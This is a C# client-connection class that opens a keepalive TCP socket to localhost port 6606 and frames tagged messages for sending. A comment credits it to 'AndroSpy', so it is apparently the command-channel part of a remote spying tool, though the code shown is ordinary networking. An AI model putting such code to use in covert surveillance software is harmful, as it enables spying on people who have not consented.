using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Client.Connection
{
    class ConnectClient
    {
        public static Socket sck = default;
        IPEndPoint endpoint = default;
        public MemoryStream globalMemoryStream = default;
        public static ConnectClient _globalService = null;
        public bool mySocketConnected = false;
        public bool CLOSE_CONNECTION = false;


        public async void SetupClient()
        {
            await Task.Run(() =>
            {
                try
                {
                    if (sck != null)
                    {
                        try { sck.Close(); } catch (Exception) { }
                        try { sck.Dispose(); } catch (Exception) { }
                    }

                    //ipadresi = Dns.GetHostAddresses(MainValues.IP)[0];
                    endpoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 6606);
                    sck = new Socket(AddressFamily.InterNetwork, SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
                    sck.ReceiveTimeout = -1; sck.SendTimeout = -1;
                    sck.ReceiveBufferSize = int.MaxValue; sck.SendBufferSize = int.MaxValue;
                    sck.NoDelay = true;

                    SetKeepAlive(sck, 2000, 1000);

                    //sck.Connect(endpoint);

                    IAsyncResult result = sck.BeginConnect(IPAddress.Parse("127.0.0.1"), 6606, null, null);

                    result.AsyncWaitHandle.WaitOne(4000, true);

                    if (sck.Connected)
                    {
                        sck.EndConnect(result);
                        Console.WriteLine("Connected");

                        mySocketConnected = true;

                        new ServerSession(sck, _globalService);
                    }
                    else
                    {
                        if (sck != null)
                        {
                            try { sck.Close(); } catch (Exception) { }
                            try { sck.Dispose(); } catch (Exception) { }
                        }
                        mySocketConnected = false;
                    }
                }
                catch (Exception)
                {
                    System.Diagnostics.Debug.WriteLine("No Internet");
                    if (sck != null)
                    {
                        try { sck.Close(); } catch (Exception) { }
                        try { sck.Dispose(); } catch (Exception) { }
                    }

                    if (CLOSE_CONNECTION)
                    {
                        //cancelAlarm(this);
                    }
                }
            });
        }

        private void SetKeepAlive(Socket instance, int KeepAliveTime, int KeepAliveInterval)
        {
            //KeepAliveTime: default value is 2hr
            //KeepAliveInterval: default value is 1s and Detect 5 times

            //the native structure
            //struct tcp_keepalive {
            //ULONG onoff;
            //ULONG keepalivetime;
            //ULONG keepaliveinterval;
            //};

            int size = Marshal.SizeOf(new uint());
            byte[] inOptionValues = new byte[size * 3]; // 4 * 3 = 12
            bool OnOff = true;

            BitConverter.GetBytes((uint)(OnOff ? 1 : 0)).CopyTo(inOptionValues, 0);
            BitConverter.GetBytes((uint)KeepAliveTime).CopyTo(inOptionValues, size);
            BitConverter.GetBytes((uint)KeepAliveInterval).CopyTo(inOptionValues, size * 2);

            instance.IOControl(IOControlCode.KeepAliveValues, inOptionValues, null);
        }


        public static byte[] MyDataPacker(string tag, byte[] message, string extraInfos = "null")
        {
            //This byte packer coded by qH0sT' - 2021 - AndroSpy.
            using (MemoryStream ms = new MemoryStream())
            {
                ms.Write(System.Text.Encoding.UTF8.GetBytes($"<{tag}>|{message.Length}|{extraInfos}>"), 0, System.Text.Encoding.UTF8.GetBytes($"<{tag}>|{message.Length}|{extraInfos}>").Length);
                ms.Write(message, 0, message.Length);
                ms.Write(System.Text.Encoding.UTF8.GetBytes("<EOF>"), 0, System.Text.Encoding.UTF8.GetBytes("<EOF>").Length);

                ms.Write(System.Text.Encoding.UTF8.GetBytes("SUFFIX"), 0, System.Text.Encoding.UTF8.GetBytes("SUFFIX").Length);
                return ms.ToArray();
            }
        }

        public static void Send(byte[] buffer)
        {
            sck.Send(buffer, 0, buffer.Length, SocketFlags.None);
        }
    }
}
